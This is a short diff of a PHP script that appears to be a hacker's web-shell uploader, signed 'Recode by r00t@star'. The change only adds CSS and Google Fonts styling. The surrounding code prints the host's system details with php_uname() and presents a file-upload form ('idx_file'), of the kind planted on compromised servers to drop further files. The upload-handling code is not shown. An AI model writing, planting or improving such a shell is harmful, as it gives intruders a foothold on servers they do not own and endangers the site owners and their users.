@@ -1,5 +1,14 @@
 <?php
-echo "Recode by r00t@star<br>";
+echo "
+<style>
+@import url('https://fonts.googleapis.com/css?family=Iceberg|Lobster|Ranga');
+html,body {
+      background-color: white;
+      font-family: 'Lobster', Ranga;
+      text-align: center;
+  }
+</style>
+Recode by r00t@star<br>";
 echo "<b>".php_uname()."</b><br>";
 echo "<form method='post' enctype='multipart/form-data'>
 	  <input type='file' name='idx_file'>
